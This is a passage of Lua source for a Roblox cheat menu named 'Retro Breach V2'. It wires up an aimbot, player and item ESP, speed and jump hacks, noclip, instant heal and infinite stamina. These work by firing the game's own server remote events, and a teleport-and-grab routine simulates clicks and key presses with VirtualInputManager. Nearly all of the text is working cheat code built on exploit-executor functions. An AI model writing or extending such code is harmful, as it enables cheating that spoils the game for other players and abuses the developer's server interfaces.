        Config.DamageMultiplier = value
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "Instant Heal",
    Default = false,
    Callback = function(value)
        Config.InstantHeal = value
    end
})
-- Instant Heal - Auto-complete healing without 2s hold
RunService.Heartbeat:Connect(function()
    if Config.InstantHeal and LocalPlayer.Character then
        local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
        if tool and tool:HasTag("Support") and not tool:HasTag("NoFunction") then
            -- Fire the healing complete event instantly
            local toolHandler = ReplicatedStorage:FindFirstChild("RemoteEvents") and ReplicatedStorage.RemoteEvents:FindFirstChild("ToolHandler")
            if toolHandler then
                local guid = game:GetService("HttpService"):GenerateGUID(false)
                toolHandler:FireServer("start", guid)
                task.wait(0.05) -- Tiny delay to avoid spam
                toolHandler:FireServer("complete", guid)
            end
        end
    end
end)
local ESPPanel = UILib:CreatePanel(Window, {
    Name = "ESP",
    DisplayName = "ESP"
})
UILib:CreateToggle(ESPPanel, {
    Label = "Player ESP",
    Default = false,
    Callback = function(value)
        Config.PlayerESP = value
        if value then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    createPlayerESP(player.Character)
                end
            end
        else
            for _, esp in pairs(_G.RetroBreach.ESPHighlights) do
                if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
                if esp.teamText then pcall(function() esp.teamText:Remove() end) end
                if esp.nameText then pcall(function() esp.nameText:Remove() end) end
            end
            _G.RetroBreach.ESPHighlights = {}
        end
    end
})
UILib:CreateToggle(ESPPanel, {
    Label = "Item ESP",
    Default = false,
    Callback = function(value)
        Config.ItemESP = value
        updateItemESP()
    end
})
UILib:CreateButton(ESPPanel, {
    Text = "Refresh ESP",
    Callback = function()
        updateItemESP()
    end
})
local PlayerPanel = UILib:CreatePanel(Window, {
    Name = "Player",
    DisplayName = "Player"
})
UILib:CreateSlider(PlayerPanel, {
    Text = "Walk Speed",
    Min = 16,
    Max = 200,
    Default = 16,
    Callback = function(value)
        Config.WalkSpeed = value
    end
})
UILib:CreateSlider(PlayerPanel, {
    Text = "Jump Power",
    Min = 50,
    Max = 200,
    Default = 50,
    Callback = function(value)
        Config.JumpPower = value
    end
})
local originalCollisionStates = {}
UILib:CreateToggle(PlayerPanel, {
    Label = "NoClip (Toggle Or Hold B)",
    Default = false,
    Callback = function(value)
        Config.NoClip = value
        if not value and LocalPlayer.Character then
            for part, originalState in pairs(originalCollisionStates) do
                if part and part.Parent then
                    part.CanCollide = originalState
                end
            end
            originalCollisionStates = {}
        elseif value and LocalPlayer.Character then
            for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    originalCollisionStates[part] = part.CanCollide
                end
            end
        end
    end
})

UILib:CreateToggle(PlayerPanel, {
    Label = "Infinite Stamina",
    Default = false,
    Callback = function(value)
        Config.InfiniteStamina = value
    end
})

local selectedItem = nil
local allItems = {}

local function getUniqueItems()
    local success, result = pcall(function()
        local itemsFolder = Workspace:FindFirstChild("ItemSpawns")
        if not itemsFolder then
            return {"No ItemSpawns folder"}
        end
        
        -- Check if player character exists
        if not LocalPlayer.Character then
            return {"Waiting for character..."}
        end
        
        local myRoot = getRoot(LocalPlayer.Character)
        if not myRoot then
            return {"No HumanoidRootPart"}
        end
        
        -- List of non-items to exclude (zone markers)
        local excludeList = {
            "EZ1", "EZ2", "EZ3", "EZ4",
            "HCZ1", "HCZ2",
            "LCZ1", "LCZ2", "LCZ3", "LCZ4", "LCZ5", "LCZ6", "LCZ7", "LCZ8",
            "Part", "SU1"
        }
        
        local itemDistances = {}
        local MAX_DISTANCE = 2500
        
        -- Scan all instances and track closest distance for each item type
        for _, item in ipairs(itemsFolder:GetChildren()) do
            local itemName = item.Name
            -- Skip if in exclude list
            local shouldExclude = false
            for _, excluded in ipairs(excludeList) do
                if itemName == excluded then
                    shouldExclude = true
                    break
                end
            end
            
            if not shouldExclude then
                local handle = item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("BasePart")
                if handle then
                    local distance = (handle.Position - myRoot.Position).Magnitude
                    -- Track closest instance of this item type
                    if not itemDistances[itemName] or distance < itemDistances[itemName] then
                        itemDistances[itemName] = distance
                    end
                end
            end
        end
        
        -- Only include items within range
        local itemNames = {}
        for itemName, distance in pairs(itemDistances) do
            if distance <= MAX_DISTANCE then
                table.insert(itemNames, itemName)
            else
            end
        end
        table.sort(itemNames)
        
        
        if #itemNames == 0 then
            return {"No items within 2500 studs"}
        end
        
        return itemNames
    end)
    
    if success then
        return result
    else
        warn("[!] Error scanning items:", result)
        return {"Error scanning items"}
    end
end

-- Initialize items
allItems = getUniqueItems()

-- Create dropdown and store reference for dynamic updates
local itemDropdown = UILib:CreateDropdown(PlayerPanel, {
    Label = "Items Within 2500 Studs",
    Options = allItems,
    EnableSearch = true,
    Callback = function(option)
        selectedItem = option
    end
})

-- Auto-refresh every 3 seconds and dynamically update dropdown
task.spawn(function()
    while true do
        task.wait(3)
        local newItems = getUniqueItems()
        
        -- Update dropdown with new items using UpdateOptions
        if itemDropdown and itemDropdown.UpdateOptions then
            itemDropdown.UpdateOptions(newItems)
        end
        
        allItems = newItems
    end
end)

-- Smooth teleport function with crash protection
local function smoothTeleport(targetPos, stepSize)
    local success, result = pcall(function()
        if not LocalPlayer.Character then return false end
        local myRoot = getRoot(LocalPlayer.Character)
        if not myRoot then return false end
        
        local startPos = myRoot.Position
        local distance = (targetPos - startPos).Magnitude
        
        -- Calculate steps with MAX LIMIT to prevent crashes
        local steps = math.ceil(distance / stepSize)
        local MAX_STEPS = 15
        
        if steps > MAX_STEPS then
            stepSize = math.ceil(distance / MAX_STEPS)
            steps = MAX_STEPS
        end
        
        -- Incremental teleport with crash protection
        for i = 1, steps do
            if not myRoot or not myRoot.Parent then break end
            
            local alpha = i / steps
            local newPos = startPos:Lerp(targetPos, alpha)
            
            pcall(function()
                myRoot.CFrame = CFrame.new(newPos)
                -- Reset all velocity types
                myRoot.Velocity = Vector3.new(0, 0, 0)
                myRoot.RotVelocity = Vector3.new(0, 0, 0)
                if myRoot.AssemblyLinearVelocity then
                    myRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                end
                if myRoot.AssemblyAngularVelocity then
                    myRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end
            end)
            
            -- Physics-safe delay
            RunService.Heartbeat:Wait()
            task.wait(math.random(10, 15) / 100)
            
            -- Extra break every 5 steps
            if i % 5 == 0 then
                task.wait(0.1)
            end
        end
        
        return true
    end)
    
    return success and result
end

local function smoothTeleport(targetPosition, stepSize)
    stepSize = stepSize or 50
    local char = LocalPlayer.Character
    if not char then return end
    
    local myRoot = getRoot(char)
    if not myRoot then return end
    
    local startPos = myRoot.Position
    local distance = (targetPosition - startPos).Magnitude
    local steps = math.ceil(distance / stepSize)
    
    for i = 1, steps do
        if not myRoot or not myRoot.Parent then break end
        
        local alpha = i / steps
        local nextPos = startPos:Lerp(targetPosition, alpha)
        
        myRoot.Velocity = Vector3.new(0, 0, 0)
        myRoot.RotVelocity = Vector3.new(0, 0, 0)
        if myRoot:FindFirstChild("AssemblyLinearVelocity") then
            myRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        end
        if myRoot:FindFirstChild("AssemblyAngularVelocity") then
            myRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
        end
        
        myRoot.CFrame = CFrame.new(nextPos)
        RunService.Heartbeat:Wait()
        
        if i % 5 == 0 then
            task.wait(0.05)
        end
    end
end

local lastGrabTime = 0
local GRAB_COOLDOWN = 6

-- Grab Selected Item button
UILib:CreateButton(PlayerPanel, {
    Text = "Grab Selected Item",
    Callback = function()
        local currentTime = tick()
        local timeSinceLastGrab = currentTime - lastGrabTime
        
        if timeSinceLastGrab < GRAB_COOLDOWN then
            local remaining = math.ceil(GRAB_COOLDOWN - timeSinceLastGrab)
            UILib:CreateNotification({
                Text = "Cooldown! Wait " .. remaining .. " seconds",
                Duration = 2
            })
            return
        end
        
        lastGrabTime = currentTime
        
        task.spawn(function()
            -- Cache critical functions/references for obfuscation resistance
            local _getRoot = getRoot
            local _getHumanoid = getHumanoid
            local _fireproximityprompt = fireproximityprompt
            local _fireclickdetector = fireclickdetector
            local _LocalPlayer = LocalPlayer
            local _Workspace = Workspace
            local _task_wait = task.wait
            local _pcall = pcall
            local _warn = warn
            local _Vector3_new = Vector3.new
            local _CFrame_new = CFrame.new
            local _math_floor = math.floor
            local _math_huge = math.huge
            local _ipairs = ipairs
            
            local debugLog = {}
            local function log(msg)
                table.insert(debugLog, os.date("%H:%M:%S") .. " - " .. msg)
                _pcall(function()
                    writefile("rbreach_debug.txt", table.concat(debugLog, "\n"))
                end)
            end
            
            log("=== STARTING ITEM GRAB ===")
            local success, err = _pcall(function()
                log("1. Checking selectedItem")
                if not selectedItem or selectedItem == "Scanning..." or selectedItem == "No items found" or selectedItem == "No ItemSpawns folder" then
                    log("ERROR: No valid item selected")
                    _warn("[!] Please select a valid item first!")
                    return
                end
                log("2. Item selected: " .. tostring(selectedItem))
                
                log("3. Checking character")
                if not _LocalPlayer.Character then
                    log("ERROR: No character")
                    _warn("[!] No character found!")
                    return
                end
                log("4. Character found")
                
                log("5. Getting HumanoidRootPart")
                local myRoot = _getRoot(_LocalPlayer.Character)
                if not myRoot then
                    log("ERROR: No HumanoidRootPart")
                    _warn("[!] No HumanoidRootPart found!")
                    return
                end
                log("6. HumanoidRootPart found")
                
                log("7. Finding ItemSpawns folder")
                local itemsFolder = _Workspace:FindFirstChild("ItemSpawns")
                if not itemsFolder then
                    log("ERROR: ItemSpawns folder not found")
                    _warn("[!] ItemSpawns folder not found!")
                    return
                end
                log("8. ItemSpawns folder found")
                
                log("9. Searching for closest item")
                local targetItem = nil
                local targetItemModel = nil
                local closestDistance = _math_huge
                
                for _, item in _ipairs(itemsFolder:GetChildren()) do
                    if item.Name == selectedItem then
                        local handle = item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("BasePart")
                        if handle then
                            local distance = (handle.Position - myRoot.Position).Magnitude
                            if distance < closestDistance then
                                closestDistance = distance
                                targetItem = handle
                                targetItemModel = item
                            end
                        end
                    end
                end
                
                if targetItem and targetItemModel then
                    log("10. Found item at distance: " .. _math_floor(closestDistance))
                    local originalPos = myRoot.CFrame
                    local distance = (targetItem.Position - myRoot.Position).Magnitude
                    
                    -- NO RANGE LIMIT - Teleport works at any distance!
                    log("11. Starting teleport to item (distance: " .. _math_floor(distance) .. " studs)")
                    -- Teleport 1 stud above item to avoid obstacles blocking vision
                    myRoot.CFrame = _CFrame_new(targetItem.Position + _Vector3_new(0, 1, 0))
                    
                    -- Immediately point camera at item after teleport
                    log("11B. Pointing camera at item immediately...")
                    _Camera.CFrame = _CFrame_new(myRoot.Position, targetItem.Position)
                    
                    log("12. Teleport complete, waiting...")
                    _task_wait(0.02)
                    
                    log("13. Looking for ProximityPrompt")
                    local proximityPrompt = targetItemModel:FindFirstChildOfClass("ProximityPrompt", true)
                    if not proximityPrompt then
                        for _, descendant in ipairs(targetItemModel:GetDescendants()) do
                            if descendant:IsA("ProximityPrompt") then
                                proximityPrompt = descendant
                                break
                            end
                        end
                    end
                    
                    if proximityPrompt then
                        log("14A. Found ProximityPrompt: " .. tostring(proximityPrompt))
                        log("14B. Prompt Name: " .. tostring(proximityPrompt.Name))
                        log("14C. Prompt Parent: " .. tostring(proximityPrompt.Parent))
                        
                        -- CRITICAL: Verify prompt belongs to the selected item
                        if proximityPrompt.Parent.Name ~= selectedItem then
                            log("ERROR: Prompt parent mismatch! Selected: " .. selectedItem .. " but prompt is on: " .. proximityPrompt.Parent.Name)
                            _warn("[!] Wrong item detected - aborting to prevent grabbing " .. proximityPrompt.Parent.Name)
                            return
                        end
                        log("14C2. Verified prompt belongs to correct item: " .. selectedItem)
                        
                        log("14D. Prompt Enabled: " .. tostring(proximityPrompt.Enabled))
                        log("14E. Checking if prompt still exists...")
                        if proximityPrompt and proximityPrompt.Parent then
                            log("14F. Prompt valid, checking enabled state...")
                            
                            -- CRITICAL FIX: Enable prompt if disabled (firing disabled prompts crashes)
                            if not proximityPrompt.Enabled then
                                log("14G. Prompt is DISABLED, enabling it...")
                                proximityPrompt.Enabled = true
                                _task_wait(0.05)  -- Faster prompt enable
                                log("14H. Prompt enabled")
                            else
                                log("14G. Prompt already enabled")
                            end
                            
                            -- Verify character is still at item location
                            if myRoot and myRoot.Parent then
                                local currentDist = (targetItem.Position - myRoot.Position).Magnitude
                                log("14I. Current distance to item: " .. _math_floor(currentDist))
                                
                                if currentDist > 10 then
                                    log("ERROR: Too far from item after teleport! Distance: " .. _math_floor(currentDist))
                                    _warn("[!] Character moved too far from item, aborting")
                                    return
                                end
                            else
                                log("ERROR: Character no longer valid!")
                                return
                            end
                            
                            -- Final check that prompt is enabled
                            if not proximityPrompt.Enabled then
                                log("ERROR: Prompt still disabled after enable attempt!")
                                return
                            end
                            
                            log("14J. All checks passed, about to grab item...")
                            local fireSuccess, fireErr = _pcall(function()
                                -- Camera already pointed from earlier, just double-check
                                _Camera.CFrame = _CFrame_new(myRoot.Position, targetItem.Position)
                                
                                log("14J2. Simulating mouse click + E press...")
                                local VIM = game:GetService("VirtualInputManager")
                                local itemScreenPos = _Camera:WorldToViewportPoint(targetItem.Position)
                                
                                -- Click item
                                VIM:SendMouseButtonEvent(itemScreenPos.X, itemScreenPos.Y, 0, true, game, 1)
                                VIM:SendMouseButtonEvent(itemScreenPos.X, itemScreenPos.Y, 0, false, game, 1)
                                _task_wait(0.03)
                                
                                -- Press E multiple times faster
                                for i = 1, 3 do
                                    VIM:SendKeyEvent(true, Enum.KeyCode.E, false, game)
                                    _task_wait(0.08)  -- Faster E hold
                                    VIM:SendKeyEvent(false, Enum.KeyCode.E, false, game)
                                    _task_wait(0.03)  -- Faster delay between presses
                                end
                                log("14K. Grab inputs sent (3x E presses)")
                            end)
                            log("14M. Fire pcall result: " .. tostring(fireSuccess))
                            if not fireSuccess then
                                log("14N. FIRE FAILED: " .. tostring(fireErr))
                            end
                        else
                            log("14O. Prompt no longer valid!")
                        end
                        log("15. Waiting for pickup...")
                        task.wait(0.05)
                        log("16. Pickup wait complete")
                    else
                        log("17. No ProximityPrompt, checking ClickDetector")
                        local clickDetector = targetItemModel:FindFirstChildOfClass("ClickDetector", true)
                        if not clickDetector then
                            for _, descendant in ipairs(targetItemModel:GetDescendants()) do
                                if descendant:IsA("ClickDetector") then
                                    clickDetector = descendant
                                    break
                                end
                            end
                        end
                        
                        if clickDetector then
                            log("18A. Found ClickDetector: " .. tostring(clickDetector))
                            log("18B. ClickDetector Parent: " .. tostring(clickDetector.Parent))
                            log("18C. About to fire click...")
                            local clickSuccess = _pcall(function()
                                _fireclickdetector(clickDetector)
                            end)
                            log("18D. Click result: " .. tostring(clickSuccess))
                            log("19. Waiting for pickup...")
                            _task_wait(0.05)
                            log("20. Pickup wait complete")
                        else
                            log("ERROR: No ProximityPrompt or ClickDetector found")
                            _warn("[!] No ProximityPrompt or ClickDetector found on:", targetItemModel.Name)
                        end
                    end
                    
                    log("21. Waiting before return teleport")
                    _task_wait(0.02)
                    if myRoot and myRoot.Parent then
                        log("22. Setting humanoid state")
                        local humanoid = _getHumanoid(_LocalPlayer.Character)
                        if humanoid then
                            humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                        end
                        _task_wait(0.02)
                        log("23. Teleporting back to origin")
                        myRoot.CFrame = originalPos
                        log("24. Return teleport complete")
                    end
                else
                    log("ERROR: Item '" .. selectedItem .. "' not found on map")
                    _warn("[!] Item '" .. selectedItem .. "' not found on map (may have been picked up or despawned)")
                end
                
                log("=== ITEM GRAB COMPLETE ===")
            end)
            
            if not success then
                log("FATAL ERROR: " .. tostring(err))
                _warn("[!] Error grabbing item:", err)
            end
        end)
    end
})
UILib:CreateButton(PlayerPanel, {
    Text = "Escape",
    Callback = function()
        local success, err = pcall(function()
            if not LocalPlayer.Character then
                warn("[!] No character found!")
                return
            end
            local myRoot = getRoot(LocalPlayer.Character)
            if not myRoot then
                warn("[!] No HumanoidRootPart found!")
                return
            end
            
            local originalPos = myRoot.CFrame
            local escapePos = Vector3.new(1112.26, 566.00, 56.86)
            local distance = (escapePos - myRoot.Position).Magnitude
            
            -- Check if escape position is within 2500 studs
            if distance > 2500 then
                UILib:CreateNotification({
                    Text = "Escape too far: " .. math.floor(distance) .. " studs! (Max 2500)",
                    Duration = 4
                })
                return
            end
            
            -- Instant teleport to escape
            myRoot.CFrame = CFrame.new(escapePos)
            
            task.wait(0.2)
            
            -- Instant teleport back
            if myRoot and myRoot.Parent then
                myRoot.Velocity = Vector3.new(0, 0, 0)
                myRoot.RotVelocity = Vector3.new(0, 0, 0)
                local humanoid = getHumanoid(LocalPlayer.Character)
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                end
                myRoot.CFrame = originalPos
            end
        end)
        if not success then
            warn("[!] Error using escape:", err)
        end
    end
})
UILib:CreateButton(PlayerPanel, {
    Text = "Refresh Items List",
    Callback = function()
        local success, err = pcall(function()
            local itemsFolder = Workspace:FindFirstChild("ItemSpawns")
            if not itemsFolder then
                warn("[!] ItemSpawns folder not found!")
                return
            end
            
            -- Same exclude list as getUniqueItems
            local excludeList = {
                "EZ1", "EZ2", "EZ3", "EZ4",
                "HCZ1", "HCZ2",
                "LCZ1", "LCZ2", "LCZ3", "LCZ4", "LCZ5", "LCZ6", "LCZ7", "LCZ8",
                "Part", "SU1"
            }
            
            local currentItems = {}
            local seen = {}
            for _, item in ipairs(itemsFolder:GetChildren()) do
                local itemName = item.Name
                -- Skip if in exclude list
                local shouldExclude = false
                for _, excluded in ipairs(excludeList) do
                    if itemName == excluded then
                        shouldExclude = true
                        break
                    end
                end
                
                if not shouldExclude and not seen[itemName] then
                    seen[itemName] = true
                    table.insert(currentItems, itemName)
                end
            end
            table.sort(currentItems)
            
            for i, name in ipairs(currentItems) do
            end
        end)
        if not success then
            warn("[!] Error refreshing items:", err)
        end
    end
})
local MiscPanel = UILib:CreatePanel(Window, {
    Name = "Misc",
    DisplayName = "Misc"
})
UILib:CreateToggle(MiscPanel, {
    Label = "Full Bright",
    Default = false,
    Callback = function(value)
        Config.FullBright = value
        if value then
            Lighting.Brightness = 2
            Lighting.ClockTime = 14
            Lighting.FogEnd = 100000
            Lighting.GlobalShadows = false
            Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
        else
            Lighting.Brightness = 1
            Lighting.ClockTime = 12
            Lighting.FogEnd = 100000
            Lighting.GlobalShadows = true
        end
    end
})
UILib:CreateButton(MiscPanel, {
    Text = "Rejoin Server",
    Callback = function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end
})
UILib:CreateButton(MiscPanel, {
    Text = "Close GUI",
    Callback = function()
        if Window.ScreenGui then
            Window.ScreenGui:Destroy()
        end
    end
})

local noclipKeyHeld = false
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.B then
        noclipKeyHeld = true
        if LocalPlayer.Character and not Config.NoClip then
            for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") and not originalCollisionStates[part] then
                    originalCollisionStates[part] = part.CanCollide
                end
            end
        end
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.B then
        noclipKeyHeld = false
        if not Config.NoClip and LocalPlayer.Character then
            for part, originalState in pairs(originalCollisionStates) do
                if part and part.Parent then
                    part.CanCollide = originalState
                end
            end
            originalCollisionStates = {}    
        end
    end
end)
local mainLoop = RunService.RenderStepped:Connect(function()
    updateAimbot()
    updatePlayerESP()
    updateItemESP()
end)
table.insert(_G.RetroBreach.Connections, mainLoop)
local playerLoop = RunService.Heartbeat:Connect(function()
    if LocalPlayer.Character then
        local humanoid = getHumanoid(LocalPlayer.Character)
        if humanoid then
            if Config.WalkSpeed ~= 16 then
                humanoid.WalkSpeed = Config.WalkSpeed
            end
            if Config.JumpPower ~= 50 then
                humanoid.JumpPower = Config.JumpPower
            end
        end
        if Config.NoClip or noclipKeyHeld then
            for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end
end)
table.insert(_G.RetroBreach.Connections, playerLoop)
Players.PlayerAdded:Connect(function(player)
    if player.Character and Config.PlayerESP then
        player.Character:WaitForChild("HumanoidRootPart", 5)
        task.wait(0.2)
        createPlayerESP(player.Character)
    end
    player.CharacterAdded:Connect(function(character)
        if Config.PlayerESP then
            character:WaitForChild("HumanoidRootPart", 5)
            task.wait(0.2)
            createPlayerESP(character)
        end
    end)
end)
Players.PlayerRemoving:Connect(function(player)
    if player and player.Character and _G.RetroBreach.ESPHighlights[player.Character] then
        local esp = _G.RetroBreach.ESPHighlights[player.Character]
        if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
        if esp.teamText then pcall(function() esp.teamText:Remove() end) end
        if esp.nameText then pcall(function() esp.nameText:Remove() end) end
        _G.RetroBreach.ESPHighlights[player.Character] = nil
    end
end)
for _, player in ipairs(Players:GetPlayers()) do
    player.CharacterAdded:Connect(function(character)
        if Config.PlayerESP then
            character:WaitForChild("HumanoidRootPart", 5)
            task.wait(0.2)
            createPlayerESP(character)
        end
    end)
end

if UILib.CreateNotification then
    UILib:CreateNotification({
        Text = "Retro Breach V2 Loaded!",
        Duration = 5,
        Color = UILib.Colors and UILib.Colors.SUCCESS or Color3.fromRGB(0, 255, 0)
    })
end
task.spawn(function()
    task.wait(1) -- Wait for UI to fully load
    local itemsFolder = Workspace:FindFirstChild("ItemSpawns")
    if itemsFolder then
        local itemNames = {}
        for _, item in ipairs(itemsFolder:GetChildren()) do
            if not table.find(itemNames, item.Name) then
                table.insert(itemNames, item.Name)
            end
        end
        table.sort(itemNames)
    else
    end
end)

-- Cache critical functions for infinite stamina (obfuscation resistance)
local _ReplicatedStorage = game:GetService("ReplicatedStorage")
local _firesignal = firesignal
local _pcall = pcall
local _task_wait = task.wait

task.spawn(function()
    while _task_wait(7) do
        _pcall(function()
            if not Config.InfiniteStamina then return end
            if not LocalPlayer.Character then return end
            
            -- Cache remote event location
            local remoteEvents = _ReplicatedStorage:FindFirstChild("RemoteEvents")
            if not remoteEvents then return end
            
            local restoreStamina = remoteEvents:FindFirstChild("RestoreStamina")
            if not restoreStamina then return end
            
            -- Fire the stamina restore event
            if _firesignal and restoreStamina.OnClientEvent then
                _firesignal(restoreStamina.OnClientEvent)
            end
        end)
    end
end)